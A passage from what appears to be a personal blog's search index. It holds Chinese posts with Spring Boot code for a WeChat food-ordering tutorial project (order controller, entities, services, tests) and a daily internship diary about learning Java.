<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[买家订单Controller]]></title>
    <url>%2F2018%2F09%2F09%2F%E4%B9%B0%E5%AE%B6%E8%AE%A2%E5%8D%95Controller%2F</url>
    <content type="text"><![CDATA[项目地址 创建BuyerOrderController.java [controller]123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123package com.imooc.sell.controller;import com.imooc.sell.VO.ResultVO;import com.imooc.sell.converter.OrderForm2OrderDTOConverter;import com.imooc.sell.dto.OrderDTO;import com.imooc.sell.enums.ResultEnum;import com.imooc.sell.exception.SellException;import com.imooc.sell.form.OrderForm;import com.imooc.sell.service.BuyerService;import com.imooc.sell.service.OrderService;import com.imooc.sell.utils.ResultVoUtil;import lombok.extern.slf4j.Slf4j;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.context.properties.bind.BindResult;import org.springframework.data.domain.Page;import org.springframework.data.domain.PageRequest;import org.springframework.util.CollectionUtils;import org.springframework.util.StringUtils;import org.springframework.validation.BindingResult;import org.springframework.web.bind.annotation.*;import javax.validation.Valid;import java.util.HashMap;import java.util.List;import java.util.Map;/** * @program: sell * @description: * @author: Junno * @create: 2018-09-07 17:42 **/@RestController@Slf4j@RequestMapping("/buyer/order")public class BuyerOrderController &#123; @Autowired private OrderService orderService; @Autowired private BuyerService buyerService; //创建订单 @PostMapping("/create") public ResultVO&lt;Map&lt;String,String&gt;&gt; create(@Valid OrderForm orderForm, BindingResult bindingResult)&#123; //判断表单验证有没有错误 if(bindingResult.hasErrors())&#123; log.error("【创建订单】 参数不正确，orderForm=&#123;&#125;", orderForm); throw new SellException(ResultEnum.PARAM_ERROR.getCode(), bindingResult.getFieldError().getDefaultMessage()); &#125; //orderFrom转换成orderDTO OrderDTO orderDTO= OrderForm2OrderDTOConverter.convert(orderForm); if (CollectionUtils.isEmpty(orderDTO.getOrderDetailList())) &#123; log.error("[创建订单] 购物车不能为空" ); throw new SellException(ResultEnum.CART_EMPTY); &#125; OrderDTO createResult = orderService.create(orderDTO); Map&lt;String,String&gt; map = new HashMap&lt;&gt;(); map.put("orderId", createResult.getOrderId()); return ResultVoUtil.success(map); &#125; //订单列表 @GetMapping("/list") public ResultVO&lt;List&lt;OrderDTO&gt;&gt; list(@RequestParam("openid") String openid, @RequestParam(value = "page",defaultValue = "0") Integer page, @RequestParam(value = "size" ,defaultValue = "10") Integer size )&#123; //判断openid是否为空 if(StringUtils.isEmpty(openid))&#123; log.error("[查询订单列表] openid为空" ); throw new SellException(ResultEnum.PARAM_ERROR); &#125; PageRequest request = new PageRequest(page,size ); Page&lt;OrderDTO&gt; orderDTOPage = orderService.findList(openid,request ); return ResultVoUtil.success(orderDTOPage.getContent()); &#125; //订单详情 @GetMapping("/detail") public ResultVO&lt;OrderDTO&gt; detail(@RequestParam("openid") String openid, @RequestParam("orderId") String orderId)&#123; OrderDTO orderDTO = buyerService.findOrderOne(openid, orderId); return ResultVoUtil.success(orderDTO); &#125; //取消订单 @PostMapping("/cancel") public ResultVO cancel(@RequestParam("openid") String openid, @RequestParam("orderId") String orderId)&#123; buyerService.findOrderOne(openid, orderId); return ResultVoUtil.success(); &#125;&#125;]]></content>
  </entry>
  <entry>
    <title><![CDATA[实习日志]]></title>
    <url>%2F2018%2F09%2F05%2F%E5%AE%9E%E4%B9%A0%E6%97%A5%E5%BF%97%2F</url>
    <content type="text"><![CDATA[2018年7月13日星期五今天是实习的第一天老师讲的基础非常细，讲了java的发展历程。和什么是jvm，jre，jdk分别是java虚拟环境、java运行环境、java开发工具包。Jdk的安装和怎样设置环境变量，通过javac指令使.java文件编译成.class文件，java指令运行.class文件。对java基础理解更深了，局部变量放在栈里，对象放在堆，作业是打印各种图形文字。 2018年7月14星期六今天学习了eclipse的安装与使用，运算符、Scanner键盘输入、if判断语句与switch的区别、Random随机数。早上说了Eclipse的配置字体大小，显示控制台，自动生成注释，各种快捷键，基本的运算符号，顺便也讲一点点面向对象的内容，如什么是面向对象。也学到了一种学习方法，带着兴趣去学习。这两天讲的都是基础知识，虽然很简单但也有些概念不能立刻说出来，理解不够深。下午是做题，用if或switch的方法。 2018年7月15日星期日 今天复习了昨天的1、选择流程控制语句:if、switch2、循环流程控制语句:for、while、do-while3、控制循环语句:break、continue4、Random 随机类产生随机数5、数组:一维数组、二维数组的定义和使用,数组间的赋值，其中switch用的不是很熟练。 2018年7月16日星期一 今天复习了方法的概述，方法的编写和基本使用，方法的重载及参数传递，方法的操作数组，比本语法的练习，条件语句，循环语句，数组的具体使用。对java的虚拟机有了更深一步认识，参数传递用到了栈、堆和方法区之间的变化图，今天的作业题对白天所复习到的知识有了更进一步的巩固。把计算机知识与生活中的一些例子结合起来能更加易于理解。 2018年7月17日星期二今天学习了1、面向对象的基本知识.面向对象:强调的是对象,然后由对象去调用功能;A:是一种更符合我们思考习惯的思想B:可以将复杂的事情简单化C:将我们从执行者变成了指挥者角色发生了转换2、类和对象的关系。类是一组相关的属性和行为的集合。对象是该类事物的具体体现3、什么是封装：将不需要对外提供的内容都隐藏起来。把属性隐藏,提供公共方法对其访问。this:代表所在类的对象引用记住: 方法被哪个对象调用,this 就代表那个对象什么时候使用 this 呢?局部变量隐藏成员变量成员变量 private,提供对应的 getXxx()/setXxx()方法4、API 的使用方法API(Application Programming Interface) : 应用程序编程接口5、Scanner 类与 String 类的区别及使用6、StringBuilder 类的使用 2018年7月18日星期三今天收获很多，做了个购物车购买商品的小程序1、对象数组2、集合类之 ArrayList4、IO 流概述及 FileWriter 类使用5、FileReader 类使用6、缓冲流介绍和使用 2018年7月19日星期四今天回顾了前几天的内容1、前面基础知识点的回顾2、基本类型和引用类型的内存解释4、面向对象中的组合和继承关系5、父类、子类实现继承操作从类与类之间的设计关系来看,子类必须属于父类的一种时,才会继承。父类抽取出了共性的内容,子类可以在父类基础上扩展新的属性与行为。子类拥有父类的所有属性与方法,无需重新定义。并且可以直接使用非私有的父类成员在每次创建子类对象时,先初始化父类内容,再初始化其子类本身内容6、继承中的方法重写7、this 和 super 关键字的作用及区别 2018年7月20日星期五今天学习的重点是1、抽象类和抽象方法抽象类用来描述一种类型应该具备的基本特征与功能,具体如何去完成这些行为由子类通过方法重写来完成。抽象方法指只有功能声明,没有功能主体实现的方法。具有抽象方法的类一定为抽象类2、接口的基本操作,及和抽象类的区别4、实现接口、或继承父类,带来的多态特性5、static 与 final 修饰符static 是静态修饰符,一般修饰成员。被 static 修饰的成员属于类,不属于单个这个类的某个对象6、package 打包,import 导入包,及四种访问修饰符7、内部类的各种形式:成员内部类、局部内部类、匿名内部类 2018年7月21日星期六今天一整天都是自习，本来以为和上周一样会有老师来上课结果什么也没有，打开自己的网盘，自学springboot微信点餐项目，跟着视频敲。在创建数据库表阶段就遇到许多问题，花了几个小时解决，原因是数据库版本不同。一天就花在数据库上面，。 2018年7月22日星期日今天放假一天，来常州有好几天了都没出去玩过，之前在路上看见有共享电动车，晚上打算和同学出去兜兜风。白天就继续学springboot微信点餐项目，来常州之前已经下载到我的笔记本上了，宿舍没网暂时影响不大。 2018年7月23日星期一又是新的一周，就是干！今天的学的内容是：1.Junit 单元测试Junit 是 Java 语言编写单元测试框架,最直观的理解,就是取代 java 类中的 main 方法。Junit 属于第三方工具,一般情况下需要导入 jar 包,而多数 Java 开发环境都集成了 Junit2.通过反射操作构造方法、成员方法、成员属性当程序要使用某个类时,如果该类还未被加载到内存中,则系统会通过加载,连接,初始化三步来实现对这个类进行初始化。加载就是指将 class 文件读入内存,并为之创建一个 Class 对象。任何类被使用时系统都会建立一个 Class 对象连接验证 是否有正确的内部结构,并和其他类协调一致准备 负责为类的静态成员分配内存,并设置默认初始化值解析 将类的二进制数据中的符号引用替换为直接引用初始化3.Properties 的基本操作Properties 类表示了一个持久的属性集。Properties 可保存在流中或从流中加载。属性列表中每个键及其对应值都是一个字符串。4.独立完成相关的综合案例 2018年7月24日星期二今天学了IO流这块内容，还不熟1、IO 流概述,字符流的回顾2、字节输入流和字节输出流3、使用字节流完成文件的复制4、高效流的使用5、字符输入流和字符输出流6、高效字符流的使用7、转换流及乱码问题的处理8、Java 对象的序列化和反序列号9、打印流简单介绍10、第三方工具:commons-io.jar 的使用11、如何使用 Eclipse 工具生成自己 jar 工具包 2018年7月25日星期三今天学的内容是1、面向对象的回顾2、常用 API 的回顾3、集合工具类的回顾4、IO 操作及递归的回顾调用阻塞IO方法获得CPU失去CPU等待状态运行状态wait()join()sleep()run()完成ExceptionError死亡状态5、多线程的基本概念6、多线程的实现方式7、线程的生命周期8、线程池9.HTTP有关知识，从网上抓取简单页面信息 2018年7月26日星期四今天深入学了线程1、多线程的安全问题及解决方案2、多线程中等待唤醒机制3、死锁的问题4、网络编程概述5、使用 UDP 协议完成数据通信6、 DatagramSocket 和 DatagramPacket 的使用7、使用 TCP 协议完成数据通信8、套接字 Socket 和 ServerSocket 的使用 2018年7月27日星期五又到周五感觉这几天过得好快，今天讲了局域网内的聊天室，用UDP 使用UDP发送数据的步骤： 1、建立发送端，空参构造； 2、创建数据； 3、建立数据包； public DatagramPacket(byte[] buf, 数据打包成的字节数组 int length, 数据的长度 InetAddress address, 目标程序IP地址 int port) 目标程序端口 4、调用Socket的发送； public void*send(DatagramPacket p) 发送数据报包 5、关闭Socket。 ps：发送端与接收端是两个对立的运行程序 2018年7月28日星期六周六又是自习，聊天室项目之前没接触过挺期待的，不过实习马上就要结束了，以后会怀念的。今天继续学之前的springboot微信点餐项目，讲到了Slf4j。2018年7月29日星期日今天还是学的springboot微信点餐那个项目，日志那块内容。 2018年7月30日星期一又是新的一周，就是干！明天是最后一天了，不松懈。今天进一步搭建局域网内的聊天室，已经初具形态，可以实现多人的聊天功能。 2018年7月31日星期二今天是最后一天，弄成的局域网内的聊天室还可以继续优化。实习圆满结束]]></content>
  </entry>
  <entry>
    <title><![CDATA[创建订单详情表]]></title>
    <url>%2F2018%2F09%2F04%2F%E5%88%9B%E5%BB%BA%E8%AE%A2%E5%8D%95%E8%AF%A6%E6%83%85%E8%A1%A8%2F</url>
    <content type="text"><![CDATA[当前项目结构 生成PayStatusEnum.java文件【enums】12345678910111213141516171819202122package com.imooc.sell.enums;import lombok.Getter;@Getterpublic enum PayStatusEnum &#123; WAIT(0,"等待支付"), SUCCESS(1,"支付成功"), ; private Integer code; private String message; PayStatusEnum(Integer code, String message) &#123; this.code = code; this.message = message; &#125;&#125; 生成OrderDetail.java文件 【dataobject】123456789101112131415161718192021222324252627282930313233343536373839404142434445package com.imooc.sell.dataobject;import lombok.Data;import javax.persistence.Entity;import javax.persistence.Id;import java.math.BigDecimal;/** * @program: sell * @description: 订单详情表 * @author: Junno * @create: 2018-09-03 19:41 **/@Entity@Datapublic class OrderDetail &#123; @Id private String detailId; /*订单id.*/ private String orderId; /*商品id*/ private String productId; /*商品名称.*/ private String productName; /*商品单价.*/ private BigDecimal productPrice; /*商品数量.*/ private Integer productQuantity; /*商品小图 */ private String productIcon; public OrderDetail() &#123; &#125;&#125; 生成OrderDetailRepository.java文件 【repository】12345678910111213141516171819package com.imooc.sell.repository;import com.imooc.sell.dataobject.OrderDetail;import org.springframework.data.jpa.repository.JpaRepository;import java.util.List;/** * @program: sell * @description: 订单详情DAO * @author: Junno * @create: 2018-09-03 20:50 **/public interface OrderDetailRepository extends JpaRepository&lt;OrderDetail,String&gt; &#123; List&lt;OrderDetail&gt; findByOrderId (String orderId);&#125; 生成OrderDetailRepositoryTest.java 文件12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849package com.imooc.sell.repository;import com.imooc.sell.dataobject.OrderDetail;import org.junit.Assert;import org.junit.Test;import org.junit.runner.RunWith;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;import org.springframework.test.context.junit4.SpringRunner;import java.math.BigDecimal;import java.util.List;import static org.junit.Assert.*;@RunWith(SpringRunner.class)@SpringBootTestpublic class OrderDetailRepositoryTest &#123; @Autowired private OrderDetailRepository repository; @Test public void saveTest()&#123; OrderDetail orderDetail = new OrderDetail(); orderDetail.setDetailId("1234567810"); orderDetail.setOrderId("111111112"); orderDetail.setProductIcon("http://xxx.jpg"); orderDetail.setProductId("11111112"); orderDetail.setProductName("辣椒炒肉"); orderDetail.setProductPrice(new BigDecimal(13.3)); orderDetail.setProductQuantity(3); OrderDetail result = repository.save(orderDetail); Assert.assertNotNull(result); &#125; @Test public void findByOrderId() &#123; List&lt;OrderDetail&gt; orderDetailList = repository.findByOrderId("111111112"); Assert.assertNotEquals(0, orderDetailList.size()); &#125;&#125; 生成OrderDTO.java文件【DTO用于数据传输】123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package com.imooc.sell.dto;import com.imooc.sell.dataobject.OrderDetail;import com.imooc.sell.dataobject.OrderMaster;import com.imooc.sell.enums.OrderStatusEnum;import com.imooc.sell.enums.PayStatusEnum;import lombok.Data;import java.math.BigDecimal;import java.util.Date;import java.util.List;/** * @program: sell * @description: 数据传输对象(用于OrderMaster和OrderDetail之间有关联在创建订单) * @author: Junno * @create: 2018-09-04 13:36 **/@Datapublic class OrderDTO &#123; /*订单id.*/ private String orderId; /*买家名字.*/ private String buyerName; /*买家手机号.*/ private String buyerPhone; /*买家地址.*/ private String buyerAddress; /*买家微信OpenId.*/ private String buyerOpenid; /*订单总金额.*/ private BigDecimal orderAmount; /*订单状态，默认为新下单*/ private Integer orderStatus; /*支付状态，默认为0未支付.*/ private Integer payStatus ; /*创建时间.*/ @JsonSerialize(using = Date2LongSerializer.class) private Date createTime; /*更新时间.*/ @JsonSerialize(using = Date2LongSerializer.class) private Date updateTime; List&lt;OrderDetail&gt; orderDetailList;&#125; 生成CartDTO.java文件 【DTO】12345678910111213141516171819202122232425package com.imooc.sell.dto;import lombok.Data;/** * @program: sell * @description: 购物车 * @author: Junno * @create: 2018-09-04 19:32 **/@Datapublic class CartDTO &#123; /*商品id.*/ private String productId; /*商品数量.*/ private Integer productQuantity; public CartDTO(String productId, Integer productQuantity) &#123; this.productId = productId; this.productQuantity = productQuantity; &#125;&#125; 生成OrderService.java [service]123456789101112131415161718192021222324252627282930313233343536373839package com.imooc.sell.service;import com.imooc.sell.dto.OrderDTO;import org.springframework.data.domain.Page;import org.springframework.data.domain.Pageable;/** * @program: sell * @description: 订单表service * @author: Junno * @create: 2018-09-04 13:29 **/public interface OrderService &#123; /*创建订单.*/ OrderDTO create(OrderDTO orderDTO); /*查询单个订单.*/ OrderDTO findOne(String orderId); /*查询订单列表.*/ Page&lt;OrderDTO&gt; findList(String buyerOpenid, Pageable pageable); /*取消订单.*/ OrderDTO cancel(OrderDTO orderDTO); /*完结订单.*/ OrderDTO finish(OrderDTO orderDTO); /*支付订单.*/ OrderDTO paid(OrderDTO orderDTO);&#125; 生成SellException.java 【exception异常处理】12345678910111213141516171819202122package com.imooc.sell.exception;import com.imooc.sell.enums.ResultEnum;/** * @program: sell * @description: sell异常处理 * @author: Junno * @create: 2018-09-04 14:25 **/public class SellException extends RuntimeException &#123; private Integer code; public SellException(ResultEnum resultEnum) &#123; super(resultEnum.getMessage()); this.code = resultEnum.getCode(); &#125;&#125; 生成KeyUtil.java文件 用于生成orderId [utils]123456789101112131415161718192021222324252627282930package com.imooc.sell.utils;import java.util.Random;/** * @program: sell * @description: * @author: Junno * @create: 2018-09-04 19:01 **/public class KeyUtil &#123; /** *@Description: 生成唯一的主键 *@格式： 时间+随机数 *@Author: Junno *@Date: 18-9-4 下午7:03 */ public static synchronized String genUniqueKey()&#123; Random random = new Random(); //6位随机数 Integer number = random.nextInt(900000)+100000; return System.currentTimeMillis()+ String.valueOf(number); &#125;&#125; 生成OrderServiceImpl.java文件 【service.impl】123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266package com.imooc.sell.service.impl;import com.imooc.sell.converter.OrderMaster2OrderDTOConverter;import com.imooc.sell.dataobject.OrderDetail;import com.imooc.sell.dataobject.OrderMaster;import com.imooc.sell.dataobject.ProductInfo;import com.imooc.sell.dto.CartDTO;import com.imooc.sell.dto.OrderDTO;import com.imooc.sell.enums.OrderStatusEnum;import com.imooc.sell.enums.PayStatusEnum;import com.imooc.sell.enums.ResultEnum;import com.imooc.sell.exception.SellException;import com.imooc.sell.repository.OrderDetailRepository;import com.imooc.sell.repository.OrderMasterRepository;import com.imooc.sell.service.OrderService;import com.imooc.sell.service.ProductService;import com.imooc.sell.utils.KeyUtil;import lombok.extern.slf4j.Slf4j;import org.hibernate.criterion.Order;import org.springframework.beans.BeanUtils;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.data.domain.Page;import org.springframework.data.domain.PageImpl;import org.springframework.data.domain.Pageable;import org.springframework.stereotype.Service;import org.springframework.util.CollectionUtils;import javax.transaction.Transactional;import java.math.BigDecimal;import java.math.BigInteger;import java.util.List;import java.util.stream.Collector;import java.util.stream.Collectors;/** * @program: sell * @description: * @author: Junno * @create: 2018-09-04 14:01 **/@Service@Slf4jpublic class OrderServiceImpl implements OrderService &#123; @Autowired private ProductService productService; @Autowired private OrderDetailRepository orderDetailRepository; @Autowired private OrderMasterRepository orderMasterRepository; /** *@Description: 创建订单 *@Author: Junno *@Date: 18-9-4 下午9:10 */ @Override @Transactional public OrderDTO create(OrderDTO orderDTO) &#123; //随机生成订单id String orderId = KeyUtil.genUniqueKey(); //初始总价0 BigDecimal orderAmount = new BigDecimal(BigInteger.ZERO);// List&lt;CartDTO&gt; cartDTOList = new ArrayList&lt;&gt;(); //1.查询商品（数量，价格） for(OrderDetail orderDetail : orderDTO.getOrderDetailList())&#123; ProductInfo productInfo = productService.findOne(orderDetail.getProductId()); if(productInfo == null)&#123;//如果为空，抛出异常 throw new SellException(ResultEnum.PRODUCT_NOT_EXIST); &#125; //2.计算订单总价：单价×数量+orderAmount orderAmount = productInfo.getProductPrice() .multiply(new BigDecimal(orderDetail.getProductQuantity())) .add(orderAmount); //订单详情入库 orderDetail.setDetailId(KeyUtil.genUniqueKey()); orderDetail.setOrderId(orderId); //把商品表中的属性拷贝到订单详情表中 BeanUtils.copyProperties(productInfo, orderDetail); orderDetailRepository.save(orderDetail);// CartDTO cartDTO = new CartDTO(orderDetail.getProductId(), orderDetail.getProductQuantity());// cartDTOList.add(cartDTO); &#125; //3.写入订单数据库（orderMaster和orderDetail) OrderMaster orderMaster = new OrderMaster(); orderDTO.setOrderId(orderId); //属性拷贝 把orderDTO中的属性拷贝到orderMaster BeanUtils.copyProperties(orderDTO, orderMaster); orderMaster.setOrderAmount(orderAmount);//计算出来的总价 orderMaster.setOrderStatus(OrderStatusEnum.NEW.getCode()); orderMaster.setPayStatus(PayStatusEnum.WAIT.getCode()); orderMasterRepository.save(orderMaster); //4.扣库存 List&lt;CartDTO&gt; cartDTOList = orderDTO.getOrderDetailList().stream().map(e -&gt; new CartDTO(e.getProductId(), e.getProductQuantity()) ).collect(Collectors.toList()); productService.decreaseStock(cartDTOList); return orderDTO; &#125; //查询单个订单 @Override public OrderDTO findOne(String orderId) &#123; OrderMaster orderMaster = orderMasterRepository.findById(orderId).orElse(null); //若订单不存在，抛异常 if(orderMaster == null)&#123; throw new SellException(ResultEnum.ORDER_NOT_EXIST); &#125; //存在，查询订单详情 List&lt;OrderDetail&gt; orderDetailList= orderDetailRepository.findByOrderId(orderId); //若订单详情为空，抛异常 if(CollectionUtils.isEmpty(orderDetailList))&#123; throw new SellException(ResultEnum.ORDERDETAIL_NOT_EXIST); &#125; //返回orderDTO OrderDTO orderDTO = new OrderDTO(); BeanUtils.copyProperties(orderMaster, orderDTO); orderDTO.setOrderDetailList(orderDetailList); return orderDTO; &#125; //查询订单列表 @Override public Page&lt;OrderDTO&gt; findList(String buyerOpenid, Pageable pageable) &#123; Page&lt;OrderMaster&gt; orderMasterPage = orderMasterRepository.findByBuyerOpenid(buyerOpenid, pageable); //Page&lt;OrderMaster&gt;转成Page&lt;OrderDTO&gt; List&lt;OrderDTO&gt; orderDTOList = OrderMaster2OrderDTOConverter.convert(orderMasterPage.getContent()); return new PageImpl&lt;&gt;(orderDTOList,pageable,orderMasterPage.getTotalElements()); &#125; //取消订单 @Override @Transactional public OrderDTO cancel(OrderDTO orderDTO) &#123; OrderMaster orderMaster = new OrderMaster(); //判断订单状态 if(!orderDTO.getOrderStatus().equals(OrderStatusEnum.NEW.getCode()))&#123; log.error("【取消订单】订单状态不正确，orderId=&#123;&#125;,orderStatus=&#123;&#125;",orderDTO.getOrderId(),orderDTO.getOrderStatus()); throw new SellException(ResultEnum.ORDER_STATUS_ERROR); &#125; //修改订单状态 orderDTO.setOrderStatus(OrderStatusEnum.CANCEL.getCode()); BeanUtils.copyProperties(orderDTO, orderMaster);//属性拷贝 OrderMaster updateResult = orderMasterRepository.save(orderMaster); if(updateResult == null)&#123; log.error("[取消订单】更新失败，orderMaster=&#123;&#125;",orderMaster); throw new SellException(ResultEnum.ORDER_UPDATE_FAIL); &#125; //返还库存 if(CollectionUtils.isEmpty(orderDTO.getOrderDetailList()))&#123; log.error("[取消订单】订单中无商品详情，orderDTO=&#123;&#125;",orderDTO); throw new SellException(ResultEnum.ORDER_DETAIL_EMPTY); &#125; List&lt;CartDTO&gt; cartDTOList = orderDTO.getOrderDetailList().stream() .map(e -&gt; new CartDTO(e.getProductId(),e.getProductQuantity() )) .collect(Collectors.toList()); productService.increaseStock(cartDTOList); //如果已支付，需要退款 if(orderDTO.getPayStatus().equals(PayStatusEnum.SUCCESS))&#123; //TODU &#125; return orderDTO; &#125; //完结订单 @Override @Transactional public OrderDTO finish(OrderDTO orderDTO) &#123; //判断订单状态 if(!orderDTO.getOrderStatus().equals(OrderStatusEnum.NEW.getCode()))&#123; log.error("[完结订单]订单状态不正确 ,orderId=&#123;&#125;,orderStatus=&#123;&#125;", orderDTO.getOrderId(),orderDTO.getOrderStatus()); throw new SellException(ResultEnum.ORDER_STATUS_ERROR); &#125; //修改订单状态 orderDTO.setOrderStatus(OrderStatusEnum.FINISHED.getCode()); OrderMaster orderMaster = new OrderMaster(); BeanUtils.copyProperties(orderDTO, orderMaster); OrderMaster updateResult = orderMasterRepository.save(orderMaster); //更新失败 if(updateResult == null)&#123; log.error("【完结订单】更新失败，orderMaster=&#123;&#125;",orderMaster); throw new SellException(ResultEnum.ORDER_UPDATE_FAIL); &#125; return orderDTO; &#125; //支付状态 @Override @Transactional public OrderDTO paid(OrderDTO orderDTO) &#123; //判断订单状态 if(!orderDTO.getOrderStatus().equals(OrderStatusEnum.NEW.getCode()))&#123; log.error("【订单支付完成】订单状态不正确，orderId=&#123;&#125;,orderStatus=&#123;&#125;",orderDTO.getOrderId(),orderDTO.getOrderStatus() ); throw new SellException(ResultEnum.ORDER_STATUS_ERROR); &#125; //判断支付状态 if(!orderDTO.getPayStatus().equals(PayStatusEnum.WAIT.getCode()))&#123; log.error("【订单支付完成】订单支付状态不正确，ordeDTO=&#123;&#125;", orderDTO); throw new SellException(ResultEnum.ORDER_PAY_STATUS_ERROR); &#125; //修改支付状态 orderDTO.setPayStatus(PayStatusEnum.SUCCESS.getCode()); OrderMaster orderMaster = new OrderMaster(); BeanUtils.copyProperties(orderDTO, orderMaster); OrderMaster updateResult = orderMasterRepository.save(orderMaster); if(updateResult == null)&#123; log.error("【订单支付完成】更新失败，orderMaster=&#123;&#125;", orderMaster); throw new SellException(ResultEnum.ORDER_UPDATE_FAIL); &#125; return orderDTO; &#125;&#125; 生成OrderServiceImplTest.java 测试123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110package com.imooc.sell.service.impl;import com.imooc.sell.dataobject.OrderDetail;import com.imooc.sell.dto.OrderDTO;import com.imooc.sell.enums.OrderStatusEnum;import com.imooc.sell.enums.PayStatusEnum;import lombok.extern.slf4j.Slf4j;import org.hibernate.criterion.Order;import org.junit.Assert;import org.junit.Test;import org.junit.runner.RunWith;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;import org.springframework.data.domain.Page;import org.springframework.data.domain.PageRequest;import org.springframework.test.context.junit4.SpringRunner;import java.util.ArrayList;import java.util.List;import static org.junit.Assert.*;@RunWith(SpringRunner.class)@SpringBootTest@Slf4jpublic class OrderServiceImplTest &#123; @Autowired private OrderServiceImpl orderService; private final String BUYER_OPENID = "110110"; //orderId数据库里找一个 private final String ORDER_ID ="1536070230178573960"; @Test public void create() &#123; OrderDTO orderDTO = new OrderDTO(); orderDTO.setBuyerName("李四"); orderDTO.setBuyerAddress("北京"); orderDTO.setBuyerPhone("01234567891"); orderDTO.setBuyerOpenid(BUYER_OPENID); //购物车 List&lt;OrderDetail&gt; orderDetailList = new ArrayList&lt;&gt;(); OrderDetail o1 = new OrderDetail(); o1.setProductId("123456"); o1.setProductQuantity(1); OrderDetail o2 = new OrderDetail(); o2.setProductId("123457"); o2.setProductQuantity(2); orderDetailList.add(o1); orderDetailList.add(o2); orderDTO.setOrderDetailList(orderDetailList); OrderDTO result = orderService.create(orderDTO); log.info("【创建订单】 result=&#123;&#125;",result); Assert.assertNotNull(result); &#125; @Test public void findOne() &#123; OrderDTO result = orderService.findOne(ORDER_ID); log.info("[查询单个订单] result=&#123;&#125;",result); Assert.assertEquals(ORDER_ID, result.getOrderId()); &#125; @Test public void findList() &#123; PageRequest request = new PageRequest(0, 2); Page&lt;OrderDTO&gt; orderDTOPage = orderService.findList(BUYER_OPENID, request); Assert.assertNotEquals(0, orderDTOPage.getTotalElements() ); &#125; @Test public void cancel() &#123; OrderDTO orderDTO = orderService.findOne(ORDER_ID); OrderDTO result = orderService.cancel(orderDTO); Assert.assertEquals(OrderStatusEnum.CANCEL.getCode(), result.getOrderStatus()); &#125; @Test public void finish() &#123; OrderDTO orderDTO = orderService.findOne(ORDER_ID); OrderDTO result = orderService.finish(orderDTO); Assert.assertEquals(OrderStatusEnum.FINISHED.getCode(), result.getOrderStatus()); &#125; @Test public void paid() &#123; OrderDTO orderDTO = orderService.findOne(ORDER_ID); OrderDTO result = orderService.paid(orderDTO); Assert.assertEquals(PayStatusEnum.SUCCESS.getCode(),result.getPayStatus()); &#125;&#125;]]></content>
      <categories>
        <category>springboot微信点餐</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[订单表创建]]></title>
    <url>%2F2018%2F09%2F03%2F%E8%AE%A2%E5%8D%95%E8%A1%A8%E5%88%9B%E5%BB%BA%2F</url>
    <content type="text"><![CDATA[生成OrderStatusEnum.java文件【enums】1234567891011121314151617181920package com.imooc.sell.enums;import lombok.Getter;@Getterpublic enum OrderStatusEnum &#123; NEW(0,"新订单"), FINISHED(1,"完结"), CANCEL(2,"已取消"), ; private Integer code; private String message; OrderStatusEnum(Integer code, String message) &#123; this.code = code; this.message = message; &#125;&#125; 生成OrderMaster.java文件 【dataobject】1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768package com.imooc.sell.dataobject;import com.imooc.sell.enums.OrderStatusEnum;import com.imooc.sell.enums.PayStatusEnum;import lombok.Data;import org.hibernate.annotations.DynamicUpdate;import javax.persistence.Entity;import javax.persistence.Id;import java.math.BigDecimal;import java.util.Date;/** * @program: sell * @description: 买家订单 * @author: Junno * @create: 2018-09-03 19:05 **/@Entity@Data@DynamicUpdate//自动更新updateTime字段public class OrderMaster &#123; /*订单id.*/ @Id private String orderId; /*买家名字.*/ private String buyerName; /*买家手机号.*/ private String buyerPhone; /*买家地址.*/ private String buyerAddress; /*买家微信OpenId.*/ private String buyerOpenid; /*订单总金额.*/ private BigDecimal orderAmount; /*订单状态，默认为新下单*/ private Integer orderStatus = OrderStatusEnum.NEW.getCode(); /*支付状态，默认为0未支付.*/ private Integer payStatus = PayStatusEnum.WAIT.getCode(); /*创建时间.*/ private Date createTime; /*更新时间.*/ private Date updateTime;&#125; 生成OrderMasterRepository.java文件 【repository】123456789101112131415161718192021222324package com.imooc.sell.repository;import com.imooc.sell.dataobject.OrderMaster;import org.springframework.data.domain.Page;import org.springframework.data.domain.Pageable;import org.springframework.data.jpa.repository.JpaRepository;/** * @program: sell * @description: 订单DAO * @author: Junno * @create: 2018-09-03 20:44 **/public interface OrderMasterRepository extends JpaRepository&lt;OrderMaster,String&gt; &#123; //分页查询,按照买家的openid来查 Page&lt;OrderMaster&gt; findByBuyerOpenid(String Openid, Pageable pageable);&#125; 生成OrderMasterRepositoryTest.java 文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051package com.imooc.sell.repository;import com.imooc.sell.dataobject.OrderMaster;import org.junit.Assert;import org.junit.Test;import org.junit.runner.RunWith;import org.springframework.beans.factory.annotation.Autowired;import org.springframework.boot.test.context.SpringBootTest;import org.springframework.data.domain.Page;import org.springframework.data.domain.PageRequest;import org.springframework.test.context.junit4.SpringRunner;import java.math.BigDecimal;import static org.junit.Assert.*;@RunWith(SpringRunner.class)@SpringBootTestpublic class OrderMasterRepositoryTest &#123; private final String OPENID="110110"; @Autowired private OrderMasterRepository repository; @Test public void saveTest()&#123; OrderMaster orderMaster = new OrderMaster(); orderMaster.setOrderId("1234567"); orderMaster.setBuyerName("张三"); orderMaster.setBuyerPhone("012345678912"); orderMaster.setBuyerAddress("北京"); 